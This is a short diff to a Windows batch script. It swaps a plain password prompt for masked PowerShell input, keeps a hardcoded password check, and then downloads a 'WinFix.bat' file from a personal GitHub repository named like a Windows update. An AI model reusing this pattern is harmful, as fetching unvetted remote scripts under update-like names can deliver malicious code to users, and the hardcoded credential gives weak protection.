@@ -1,6 +1,7 @@
 echo off
 @echo off
-set /p "pass=Enter password: "
+for /f "delims=" %%P in ('powershell -Command "$pass = Read-Host 'Enter password' -AsSecureString; $BSTR=[System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($pass); [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($BSTR)"') do set "pass=%%P"
+
 if "%pass%"=="Welcome@123" (
     echo Access granted.
     REM Place your commands here
@@ -9,6 +10,7 @@ if "%pass%"=="Welcome@123" (
     pause
     exit
 )
+
 set URL=https://raw.githubusercontent.com/acd167493/WinUpdate/refs/heads/main/WinFix.bat
 set OUTPUT=WinFix.bat
 powershell -Command "irm '%URL%' -OutFile '%OUTPUT%'"
